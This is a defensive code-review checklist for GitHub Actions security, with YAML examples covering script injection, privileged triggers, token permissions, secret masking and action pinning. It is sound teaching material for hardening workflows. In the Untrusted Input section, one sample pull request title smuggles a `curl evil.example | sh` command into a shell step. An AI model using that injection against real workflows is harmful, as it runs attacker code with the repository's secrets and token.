# GitHub Actions — Code Review Checklist

> Check sibling workflows for existing patterns before flagging a convention (see Consistency Check step). Report an item only with a concrete trigger → effect in the changed workflow. A problem that a workflow linter the repository runs, such as actionlint or zizmor, already reports is not a finding. This file covers the workflow files directly in `.github/workflows/` at the repository root and the metadata of actions (`action.yml` or `action.yaml` with a `runs:` key). What a step can do depends on the trigger (`on:`), the `permissions` of the `GITHUB_TOKEN`, the secrets the job receives and the runner, so read all four before judging a step. A workflow never shows the language or the framework of the application: a step that sets up a toolchain proves nothing about the code.

## Untrusted Input

- **Expressions in scripts**: GitHub replaces `${{ ... }}` before the shell runs, so a value that an outside contributor controls, placed directly in `run:` or in the `script:` of `actions/github-script`, becomes part of the script. Such values include `github.event.pull_request.title` and `.body`, `github.event.issue.title` and `.body`, `github.event.comment.body`, `github.event.review.body`, `github.head_ref`, commit messages and author names, and branch names. A title such as `"; curl evil.example | sh #` then runs commands with the job's token and secrets. Pass the value through `env:` and use the shell variable, quoted. **Not a finding:** values that only the repository's maintainers control, such as `github.sha`, `github.ref` on `push`, `github.repository` and `inputs` of `workflow_dispatch` in a repository where only maintainers can run it.
- **Privileged triggers running pull request code**: `pull_request_target` and `workflow_run` run in the context of the base repository. The risk applies only where untrusted code actually runs there with the job's effective permissions, secrets and checkout. A job on these triggers that checks out the pull request head (`ref: ${{ github.event.pull_request.head.sha }}`, or the head branch) and then runs anything from it, such as an install script, a build, tests or a local action, runs the contributor's code with those privileges, unless the checkout refuses first. `actions/checkout` v7 refuses by default to check out fork pull request code under these two triggers, and the job fails before any code runs, unless the step sets `allow-unsafe-pr-checkout: true`. A refused checkout is a workflow failure, not executed untrusted code. Read the exact `actions/checkout` version and its `allow-unsafe-pr-checkout` input before deciding; do not assume an older major version bypasses the guard, because the v4 and v6 READMEs document the same input with the default `false`. The guard covers only `actions/checkout`: a `run` step that fetches the fork head with `git` or `gh` is not covered by it. The event alone does not prove that every secret reaches the job or that a write scope is granted, so check the job's `permissions` and the secrets it reads. Keep untrusted code in a `pull_request` workflow and pass only data (artifacts) to the privileged one, treating that data as untrusted too.
- **Comment-triggered commands**: an `issue_comment` job that runs a privileged action for whoever writes a command in a comment acts for any GitHub user. Check `github.event.comment.author_association`, or the commenter's permission, before acting.
- **Writing to `$GITHUB_ENV` or `$GITHUB_OUTPUT`**: a step that writes an untrusted value into `$GITHUB_ENV`, `$GITHUB_OUTPUT` or `$GITHUB_PATH` can add other lines through a newline in the value, and set variables such as `NODE_OPTIONS`, `BASH_ENV` or `LD_PRELOAD` for later steps. Use the multiline delimiter syntax with a random delimiter, or validate the value.

**Bad** — the pull request title becomes part of the shell script:

```yaml
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Checking ${{ github.event.pull_request.title }}"
```

**Good** — the title reaches the script only as a quoted environment variable:

```yaml
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "Checking $TITLE"
```

## Permissions and Secrets

- **Token permissions wider than the job needs**: without a `permissions:` key, the `GITHUB_TOKEN` gets the default set at the enterprise, organization or repository level, and the workflow file does not show that default. Repositories inherit from their organization, and organizations can inherit from their enterprise. The February 2023 change made the new defaults read-only and did not change existing enterprises, organizations or repositories, so a repository's creation date shows neither its token scope nor whether it is safe. Do not infer the scope from the creation date, and do not ask for settings changes. Report `permissions: write-all`, or write scopes such as `contents: write`, `pull-requests: write`, `id-token: write` or `actions: write`, declared on a job that also runs code from a pull request, a third-party action or a dependency install it does not need them for. **Not a finding:** a job whose only steps need that scope, such as a release job that pushes a tag.
- **Secrets given to code that does not need them**: a secret set in workflow-level `env:`, passed to every step, or `secrets: inherit` to a reusable workflow, reaches every action and script of the job, including third-party ones. Pass each secret only to the step that uses it.
- **Transformed secrets in logs**: redaction is performed by the runner, for the exact values it knows in that job: the secrets the job received and the values registered with `::add-mask::`. Because a secret can be transformed in many ways, GitHub does not guarantee redaction of a derived value, such as the secret encoded in base64 or URL-encoded form, split, or embedded in JSON. Report a step that emits a derived value which is an actual unmasked representation of the secret, meaning the job did not register it with `::add-mask::` before the output. Being transformed is not enough by itself; check whether the derived value was registered first. Runner redaction does not cover a value the job neither received nor registered, so the masking protection never exempts it. This review cannot verify the logs; state that limit, and do not print any real secret while reporting.
- **Persisted checkout credentials**: `actions/checkout` persists the token by default (`persist-credentials: true`), and where it is stored depends on the version. The v4 README describes the token in the local git config, removed during post-job cleanup. The v6 and v7 READMEs describe a separate credential file under `$RUNNER_TEMP` instead of directly in `.git/config`, so a `.git` config that refers to that file does not hold the value. Report a later artifact or cache step in the same job only when its paths include the file that actually holds the credential for that checkout version. Check the version and the upload paths rather than assuming the `.git` directory holds the token. Set `persist-credentials: false` when no later step pushes, or upload only paths that do not include the credential; these are contextual mitigations, not a blanket requirement.

## Supply Chain and Runners

- **Actions referenced by a moving tag or branch**: `uses: owner/action@v2` or `@main` runs whatever that tag or branch points to at run time, and a compromised action repository can move it, as happened to `tj-actions/changed-files` in March 2025 (CVE-2025-30066). Report a third-party action that the change adds or moves to a tag or branch in a job that has secrets or a token that can write. Pin it to a full commit SHA. **Not a finding:** actions in the same repository (`uses: ./.github/actions/...`) or organization, and a repository or organization policy that already requires full-length SHA pinning.
- **Self-hosted runners for public pull requests**: a public repository whose `pull_request` workflows run on a self-hosted runner lets any contributor run code on that machine, which can keep files and processes between jobs and reach the internal network. Use GitHub-hosted or ephemeral, isolated runners for those workflows.
- **Concurrent deployments**: a deploy job without a `concurrency` group can run twice at the same time, so an older run can finish last and deploy older code. `cancel-in-progress: true` on a deploy job can cancel a deployment halfway. Use a `concurrency` group per environment, without cancelling deploys in progress.

**Bad** — a tag of a third-party action receives the deploy key:

```yaml
steps:
  - uses: example-org/deploy-action@v3
    with:
      key: ${{ secrets.DEPLOY_KEY }}
```

**Good** — the action is pinned to a full commit SHA, with its tag noted for updates:

```yaml
steps:
  - uses: example-org/deploy-action@5f2c3a1e9b7d4c6a8e0f1b2d3c4e5f6a7b8c9d0e # v3.2.1
    with:
      key: ${{ secrets.DEPLOY_KEY }}
```

## Conventions, not defects

- Job and step names, the split into reusable workflows or composite actions, matrix layout and caching choices follow the repository's conventions.
- Pinning first-party `actions/*` actions by SHA, adding `timeout-minutes` and adding `harden-runner` are hardening choices, findings only with a concrete effect in the changed workflow.

## Sources

- Secure use of GitHub Actions and script injections: https://docs.github.com/en/actions/reference/security/secure-use, https://docs.github.com/en/actions/concepts/security/script-injections
- `pull_request_target` and `workflow_run`: https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows; fork pull request checkout guard: https://raw.githubusercontent.com/actions/checkout/v7/README.md; GitHub Security Lab on privileged triggers and untrusted input: https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/, https://securitylab.github.com/resources/github-actions-untrusted-input/
- `GITHUB_TOKEN` permissions: https://docs.github.com/en/actions/concepts/security/github_token, https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#permissions, https://docs.github.com/en/actions/tutorials/authenticate-with-github_token; the February 2023 default change, which left existing entities unchanged: https://github.blog/changelog/2023-02-02-github-actions-updating-the-default-github_token-permissions-to-read-only/
- Secrets and masking: https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets; workflow commands, `GITHUB_ENV` and multiline values: https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands
- `actions/checkout` and `persist-credentials`, by version: https://raw.githubusercontent.com/actions/checkout/v4/README.md, https://raw.githubusercontent.com/actions/checkout/v6/README.md, https://raw.githubusercontent.com/actions/checkout/v7/README.md
- `tj-actions/changed-files` advisory: https://github.com/advisories/GHSA-mrrh-fwg8-r2c3
- Self-hosted runner security: https://docs.github.com/en/actions/concepts/runners/self-hosted-runners; concurrency: https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run/control-workflow-concurrency

## Precedents

- **Fork pull requests get no secrets**: a `pull_request` workflow triggered from a fork receives no repository secrets, except the `GITHUB_TOKEN`, and that token is read-only. Do not report secret theft or repository writes by fork code in a `pull_request` workflow. **Exception:** `pull_request_target` and `workflow_run`, which run with the base repository's secrets and token, `issue_comment` jobs that check out the pull request head, the private-repository settings that send secrets or write tokens to fork pull requests, pull requests from branches of the same repository, and self-hosted runners that keep state between jobs.
- **Registered secrets are masked in logs**: the runner replaces the exact value of a secret it knows in the job, meaning a secret the job received or a value registered with `::add-mask::`, with `***` in job logs. Do not report such an exact value printed unchanged by a step as visible in the logs. **Exception:** transformed values, such as base64, split or JSON-escaped secrets, unless registered with `::add-mask::` before output; structured secrets whose parts are printed separately; values the job neither received nor registered; and secrets written to artifacts, caches, job outputs or files, which masking does not cover. GitHub does not guarantee redaction of transformed values, so do not assume it for them.
- **Environment variables keep untrusted text out of the script**: a value assigned to `env:` with `${{ }}` and read in `run:` as a quoted shell variable (`"$TITLE"`) is data, never part of the script's source. Do not report script injection for untrusted values passed that way. **Exception:** the variable passed to `eval`, `sh -c` or another interpreter, used unquoted where word splitting or globbing changes the command, or written to `$GITHUB_ENV`, `$GITHUB_OUTPUT` or `$GITHUB_PATH`, and `${{ }}` expressions placed directly in `run:` or in a `github-script` `script:`.
